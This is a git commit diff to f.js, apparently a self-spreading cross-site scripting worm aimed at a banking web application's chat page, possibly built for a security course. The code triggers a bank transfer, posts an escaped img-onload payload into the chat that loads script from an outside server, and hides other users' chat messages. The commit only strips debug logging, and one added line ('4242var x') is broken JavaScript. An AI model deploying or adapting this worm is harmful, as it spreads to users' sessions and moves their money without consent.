95f2c5ade248b959090ed0ba85b1df24c6b92008
Marcel Pfefferle <marcel.pfefferle@rub.de>
2018-07-16 15:39:35 +0200

    rm logs

--- f.js
+++ f.js
@@ -1,5 +1,3 @@
-console.log('still works');
-
 // Überweisung ausführen
 (function(){ // anonyme, selbstausführende Funktion
     var x = new XMLHttpRequest();
@@ -11,7 +9,7 @@ console.log('still works');
 
 // sich selbst in den Chat schreiben
 (function(){ // anonyme, selbstausführende Funktion
-    var x = new XMLHttpRequest();
+    4242var x = new XMLHttpRequest();
     var payload =  "4242\\u003cimg src=\\u0022data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\\u0022 onload=\\u0022script = document.createElement('script');script.src ='http://pfefferle.online:8008/f.js';document.head.appendChild(script);\\u0022\\u003e";
     x.open('POST', '/banking/?page=chat');
     x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
@@ -22,20 +20,10 @@ console.log('still works');
 (function(){ // anonyme, selbstausführende Funktion
     var btns = document.getElementsByClassName("closebtn");
     for (var i = 0; i < btns.length; i++) {
-        // works //  console.log(i);
         var div=btns[i].parentNode.getElementsByTagName('div');
-        if (div.length != 1){
-            console.log('WTF: div.length='+div.length+' of btns['+i+'] should be 1');
-        }
-        console.log('A');
-        if (div[0].innerText == '4242'){ // if true div is from own worm.
-            console.log('B innner='+div[0].innerText);
-            // don't delete
-        } else {
-            console.log('D');
+        if (div[0].innerText != '4242'){ // then click hide box
             var x = new XMLHttpRequest();
             x.open('GET', btns[i].href);
-            console.log(btns[i].href);
             x.send();
             //    btns[i].href //full url
             //    btns[i].getAttribute('href') //without base
